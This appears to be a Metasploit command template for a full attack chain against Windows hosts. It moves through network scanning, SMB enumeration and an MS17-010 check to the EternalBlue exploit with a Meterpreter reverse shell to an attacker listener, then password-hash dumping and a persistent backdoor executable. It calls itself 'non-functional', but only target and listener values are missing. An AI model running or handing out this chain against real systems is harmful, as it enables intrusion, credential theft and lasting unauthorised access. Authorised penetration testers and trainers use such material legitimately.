# Full Penetration Test Chain Template
# For Training Use â€“ Non-functional Template

# Phase 1: Reconnaissance
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS <TARGET_RANGE>
run

use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET_RANGE>
set PORTS 1-1000
run

# Phase 2: Service Enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS <TARGET_RANGE>
run

use auxiliary/scanner/http/http_version
set RHOSTS <TARGET_RANGE>
run

# Phase 3: Vulnerability Assessment
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_RANGE>
run

# Phase 4: Exploitation
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RHOST <TARGET_IP>
set LHOST <LHOST>
set LPORT <LPORT>
exploit -j

# Phase 5: Post-Exploitation
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

use post/windows/gather/hashdump
set SESSION 1
run

# Phase 6: Persistence
use post/windows/manage/persistence_exe
set SESSION 1
set REXEPATH /tmp/backdoor.exe
run